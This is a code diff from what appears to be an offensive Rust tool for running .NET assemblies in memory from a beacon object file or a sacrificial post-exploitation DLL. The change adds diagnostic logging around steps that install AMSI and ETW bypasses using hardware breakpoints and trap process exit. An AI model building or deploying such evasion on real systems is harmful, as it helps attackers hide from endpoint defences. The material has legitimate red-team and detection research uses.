@@ -29,6 +29,13 @@ pub mod nlog;
 #[cfg(target_os = "windows")]
 pub mod bypasses;
 
+/// Optional diagnostic logger. When `Some`, orchestrate calls it at
+/// each major step so the caller can write to its own diagnostic sink.
+/// The BOF passes `None`; the postex DLL passes a wrapper around
+/// `senjata_runner::debug_log::log` for the v0.3.x debugging phase.
+#[cfg(target_os = "windows")]
+pub type DiagLogFn = unsafe extern "C" fn(msg: *const u8, len: usize);
+
 /// Parsed-args bag passed to `orchestrate`. Both the BOF (inline mode)
 /// and the postex DLL (sacrificial mode) parse their wire-format args
 /// into this struct after parsing. Borrows live for the duration of the
@@ -46,6 +53,17 @@ pub struct OrchestrateInput<'a> {
     pub mode: u32,
     pub main_name: &'a str,
     pub asm_bytes: &'a [u8],
+    /// Optional diagnostic logger (see `DiagLogFn`).
+    pub log_fn: Option<DiagLogFn>,
+}
+
+/// Internal: emit `msg` via the caller-supplied logger if set.
+#[cfg(target_os = "windows")]
+#[inline]
+fn dlog(input: &OrchestrateInput<'_>, msg: &[u8]) {
+    if let Some(f) = input.log_fn {
+        unsafe { f(msg.as_ptr(), msg.len()) };
+    }
 }
 
 /// Caller-supplied hook for streaming mode: receives the pipe-read HANDLE
@@ -120,8 +138,11 @@ unsafe fn orchestrate_internal(
     ctx: *mut core::ffi::c_void,
 ) -> Result<(), OrchestratorError> {
     unsafe {
+        dlog(input, b"[orch] entered");
+
         // PE parser → runtime detection (single-file mode only; multi-file
         // mode trusts the caller-bundled blob).
+        dlog(input, b"[orch] pe_parser::parse");
         let asm_info = if input.mode == 1 {
             pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
         } else {
@@ -131,23 +152,32 @@ unsafe fn orchestrate_internal(
                 other => OrchestratorError::PeParse(other),
             })?
         };
+        dlog(input, b"[orch]   pe_parser ok");
 
         // Install ETW / AMSI / AllocConsole HWBP bypasses.
+        dlog(input, b"[orch] bypasses::install");
         let _bypasses = bypasses::install(engine, input.amsi, input.etw)?;
+        dlog(input, b"[orch]   bypasses ok");
 
         // Open the output channel BEFORE the CLR initializes stdio.
+        dlog(input, b"[orch] IoChannel::open");
         let mut io_ch = io::IoChannel::open(input.mailslot, input.slot_name, input.pipe_name)?;
+        dlog(input, b"[orch]   IoChannel ok");
 
         // Streaming mode: hand the read handle to the caller, exactly once,
         // before the CLR starts writing.
         let streaming = hook.is_some();
         if let Some(h) = hook {
+            dlog(input, b"[orch] calling pipe_ready_hook");
             h(io_ch.read_handle(), ctx);
+            dlog(input, b"[orch]   pipe_ready_hook returned");
         }
 
         // Capture the cleanup point for the exit-trap (re-entry after
         // Environment.Exit). The trap is installed below before dispatch.
+        dlog(input, b"[orch] save_cleanup_point");
         let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
+        dlog(input, b"[orch]   cleanup point saved");
         // Two paths land here:
         //   A. First entry: dispatch the assembly, then drain.
         //   B. Re-entry from RtlExitUserProcess exit-trap: dispatch_result?
@@ -165,10 +195,13 @@ unsafe fn orchestrate_internal(
                     module_hash: ntdll_h,
                     export_hash: exit_h,
                 })?;
+            dlog(input, b"[orch] install_exit_trap");
             let _exit_trap = engine
                 .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                 .map_err(OrchestratorError::Hwbp)?;
+            dlog(input, b"[orch]   exit_trap installed");
 
+            dlog(input, b"[orch] dispatch::dispatch");
             let dispatch_result = dispatch::dispatch(
                 &asm_info,
                 input.asm_bytes,
@@ -179,6 +212,7 @@ unsafe fn orchestrate_internal(
                 input.main_name,
                 io_ch.write_handle() as usize,
             );
+            dlog(input, b"[orch]   dispatch returned");
 
             // Path A: assembly Main returned normally.
             #[cfg(feature = "debug-io")]
